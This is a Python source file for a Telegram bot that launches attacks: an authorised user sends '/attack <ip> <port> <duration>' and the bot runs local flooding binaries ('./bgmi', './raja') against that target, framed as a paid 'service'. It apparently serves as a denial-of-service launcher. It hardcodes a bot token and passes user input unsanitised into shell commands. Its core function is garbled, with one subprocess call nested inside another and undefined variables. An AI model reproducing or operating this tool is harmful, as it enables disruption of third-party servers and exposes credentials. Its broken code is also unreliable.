import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7521417050:AAFZgoftQ2xJUb9Y8JK0RAiwtX1veKcGOIc'
ALLOWED_USER_ID = 1885926472  
bot_access_free = True  

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
        process2 = await asyncio.create_subprocess_shell(
            f"./bgmi {target} {port} {time_duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout2, stderr2 = await process2.communicate()
        if stdout2:
            print(f"[stdout Moin]\n{stdout2.decode()}")
        if stderr2:
            print(f"[stderr Moin]\n{stderr2.decode()}")
            f"./raja {target} {port} {time}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌𝐘𝐞 𝐆𝐚𝐫𝐞𝐞𝐛 𝐈𝐬𝐤𝐞 𝐏𝐚𝐚𝐬 𝐀𝐜𝐜𝐞𝐬𝐬 𝐇𝐞 𝐍𝐚𝐡𝐢!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()
